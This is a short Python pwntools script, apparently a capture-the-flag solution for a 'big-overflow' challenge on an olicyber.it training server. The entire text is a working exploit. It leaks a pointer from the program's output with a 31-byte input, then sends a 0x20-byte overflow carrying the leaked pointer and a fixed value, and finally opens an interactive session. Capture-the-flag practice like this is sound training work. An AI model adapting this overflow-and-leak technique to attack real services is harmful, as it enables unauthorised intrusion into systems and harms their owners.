from pwn import *

VALUE = p64(0x5ab1bb0)

# r = process("./bigof")
r = remote("big-overflow.challs.olicyber.it", 34003)

r.sendline(b"a" * 31)
line = r.recvuntil(b"but")[:-3]

STDOUT = p64(int.from_bytes(line.split()[-1][:8], byteorder="little"))
print(STDOUT)

r.sendline(b"a" * 0x20 + STDOUT + VALUE)
r.interactive()
